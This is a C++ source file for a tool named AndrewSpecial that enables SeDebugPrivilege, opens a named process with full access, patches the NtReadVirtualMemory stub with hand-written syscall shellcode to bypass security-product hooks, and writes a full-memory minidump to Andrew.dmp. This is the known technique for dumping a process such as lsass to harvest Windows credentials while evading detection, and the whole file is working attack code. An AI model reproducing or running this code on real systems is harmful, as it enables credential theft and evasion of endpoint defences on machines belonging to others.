#include "AndrewSpecial.h"

DWORD GetProcId(const wchar_t* ProcName)
{
	PROCESSENTRY32   pe32;
	HANDLE         hSnapshot = NULL;

	pe32.dwSize = sizeof(PROCESSENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(hSnapshot, &pe32))
	{
		do {
			if (wcscmp(pe32.szExeFile, ProcName) == 0) {
				return pe32.th32ProcessID;
				break;
			}

		} while (Process32Next(hSnapshot, &pe32));
	}
	if (hSnapshot != INVALID_HANDLE_VALUE)
		CloseHandle(hSnapshot);

	return NULL;
}

bool SetPrivilege(LPCWSTR lpszPrivilege, BOOL bEnablePrivilege) {
	TOKEN_PRIVILEGES priv = { 0,0,0,0 };
	HANDLE hToken = NULL;
	LUID luid = { 0,0 };
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		if (hToken)
			CloseHandle(hToken);
		return false;
	}
	if (!LookupPrivilegeValueW(0, lpszPrivilege, &luid)) {
		if (hToken)
			CloseHandle(hToken);
		return false;
	}
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Luid = luid;
	priv.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
	if (!AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0)) {
		if (hToken)
			CloseHandle(hToken);
		return false;
	}
	if (hToken)
		CloseHandle(hToken);
	return true;
}



void getversion_long()
{
	static auto RtlGetVersion = (RtlGetVersion_t)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlGetVersion");

	auto osvi = OSVERSIONINFOEXW{ sizeof(OSVERSIONINFOEXW) };

	RtlGetVersion((POSVERSIONINFOW)&osvi);

	auto version_long = (osvi.dwMajorVersion << 16) | (osvi.dwMinorVersion << 8) | osvi.wServicePackMajor;

	printf("Version Long: %d %x\n", version_long, version_long);
}

BYTE GetNtReadVirtualMemorySyscall()
{

	//                    7 and Pre-7     2012SP0   2012-R2    8.0     8.1    Windows 10+
	//NtReadVirtualMemory 0x003c 0x003c    0x003d   0x003e    0x003d 0x003e 0x003f 0x003f 

	BYTE syscall_id = 0x3c;
	static auto RtlGetVersion = (RtlGetVersion_t)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlGetVersion");

	auto osvi = OSVERSIONINFOEXW{ sizeof(OSVERSIONINFOEXW) };

	RtlGetVersion((POSVERSIONINFOW)&osvi);

	auto version_long = (osvi.dwMajorVersion << 16) | (osvi.dwMinorVersion << 8) | osvi.wServicePackMajor;

	if (version_long < win8) //before win8
	{
		syscall_id = 0x3c;
	}
	else if (version_long == win8) //win8 and server 2008 sp0
	{
		syscall_id = 0x3d;
	}
	else if (version_long == win81) //win 8.1 and server 2008 r2
	{
		syscall_id = 0x3e;
	}
	else if (version_long > win81) //anything after win8.1
	{
		syscall_id = 0x3f;
	}


	return syscall_id;

}

void Free_NtReadVirtualMemory()
{
	BYTE syscall = GetNtReadVirtualMemorySyscall(); //Get the syscall id for NtRVM for your particular os

	printf("ntReadVirtualMemory Syscall is %x\n", syscall);

#ifdef  _WIN64
	BYTE Shellcode[] =
	{
		0x4C, 0x8B, 0xD1,                               // mov r10, rcx; NtReadVirtualMemory
		0xB8, 0x3c, 0x00, 0x00, 0x00,                   // eax, 3ch
		0x0F, 0x05,                                     // syscall
		0xC3                                            // retn
	};

	Shellcode[4] = syscall;
#else
	BYTE Shellcode[] =
	{
		0xB8, 0x3c, 0x00, 0x00, 0x00,                   // mov eax, 3ch; NtReadVirtualMemory
		0x33, 0xC9,                                     // xor ecx, ecx
		0x8D, 0x54, 0x24, 0x04,                         // lea edx, [esp + arg_0]
		0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00,       // call large dword ptr fs : 0C0h
		0x83, 0xC4, 0x04,                               // add esp, 4
		0xC2, 0x14, 0x00                                // retn 14h
	};

	Shellcode[1] = syscall;
#endif //  _WIN64
	WriteProcessMemory(GetCurrentProcess(), NtReadVirtualMemory, Shellcode, sizeof(Shellcode), NULL);
}

bool AndrewSpecial(const wchar_t * ProcessName)
{
	SetPrivilege(L"SeDebugPrivilege", TRUE); //set SeDebugPrivilege

	auto pid = GetProcId(ProcessName);

	auto hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if(hProc)
	{
		printf("RPM: %p ---- ntRVM: %p\n", ReadProcessMemory, NtReadVirtualMemory); //Tell me you where the functions are in memory

		Free_NtReadVirtualMemory(); //Repatch the jmp

		HANDLE hFile = CreateFileA("Andrew.dmp", GENERIC_ALL, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr); //Create the dmp file

		if (!hFile)
		{
			printf("Failed to write dump: Invalid dump file\n");
		}
		else
		{
			if (hProc)
			{
				printf("Got %S handle: %x\n", ProcessName, hProc);

				BOOL Result = MiniDumpWriteDump(hProc, //does the dump
					pid,
					hFile,
					MiniDumpWithFullMemory,
					nullptr,
					nullptr,
					nullptr);

				CloseHandle(hFile);

				if (!Result)
				{
					printf("Error: MiniDumpWriteDump failed with code %x\n", GetLastError());
				}
				else
				{
					printf("Successfully launched the AndrewSpecial. Looks for Andrew.dmp\n");
					return 0;
				}
			}
			else
			{
				printf("OpenProcess Failed.\n");
			}
		}
	}
	else
	{
		printf("Couldn't open a handle to %S\n", ProcessName);
	}
	return 1;
}
